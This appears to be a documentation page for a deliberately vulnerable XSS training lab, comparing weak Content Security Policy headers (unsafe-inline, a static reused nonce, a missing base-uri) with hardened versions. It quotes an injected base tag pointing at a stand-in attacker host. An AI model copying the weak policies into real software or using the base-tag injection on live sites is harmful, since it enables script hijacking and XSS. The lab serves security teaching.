# Category 07 — Content Security Policy (CSP) & Filter Behavior

## Overview
Content Security Policy (CSP) is an HTTP response header that restricts the resources (scripts, images, stylesheets, frames) that the browser is allowed to load and execute for a given page. While CSP is a vital layer of defense-in-depth, weak directives or misconfigurations can render it ineffective against XSS.

In NimbusBoard, Category 7 explores:
1. **Weak Route-Specific CSP Header Analysis** (`XSS-CSP-01`)
2. **Nonce-Based CSP Behavior & Configuration Errors** (`XSS-CSP-02`)

---

## Exercise 1: XSS-CSP-01 — Weak Route-Specific CSP Header Analysis

### Vulnerability Context
- **Target Route**: `/search`
- **Middleware**: [src/middleware/csp.js](file:///c:/nimbusboard-xss-lab/src/middleware/csp.js)
- **Concept**: Including `'unsafe-inline'` in `script-src` permits arbitrary inline `<script>` tags and inline event handlers, negating the primary defense CSP provides against reflected and stored XSS.

### Comparison
- **Vulnerable Policy**:
  ```http
  Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';
  ```
- **Hardened Fixed Policy**:
  ```http
  Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; object-src 'none'; base-uri 'self';
  ```

---

## Exercise 2: XSS-CSP-02 — Nonce Directives & Base-URI Hijacking

### Vulnerability Context
- **Target Route**: `/api/challenges/csp/test`
- **Concept**: Two common CSP architectural flaws:
  1. **Nonce Reuse**: Using a hardcoded, static nonce (e.g., `nonce-static123`) across multiple requests, allowing an attacker to predict and reuse the nonce.
  2. **Missing `base-uri`**: Without `base-uri 'self'`, an attacker who can inject a `<base href="https://attacker.com/">` tag can hijack relative script paths.

### Comparison
- **Vulnerable Mode**:
  ```http
  Content-Security-Policy: default-src 'self'; script-src 'nonce-reusedStaticNonce123';
  ```
  *(Missing `base-uri` directive and uses static nonce)*
- **Fixed Mode**:
  ```http
  Content-Security-Policy: default-src 'self'; script-src 'nonce-{RANDOM_CRYPTO_BYTES}'; base-uri 'self'; object-src 'none';
  ```
  *(Generates a unique `crypto.randomBytes(16)` per request and sets `base-uri 'self'`)*

---

## Verification

Run the automated Playwright verification test:
```bash
npx playwright test -g "CAT-07"
```
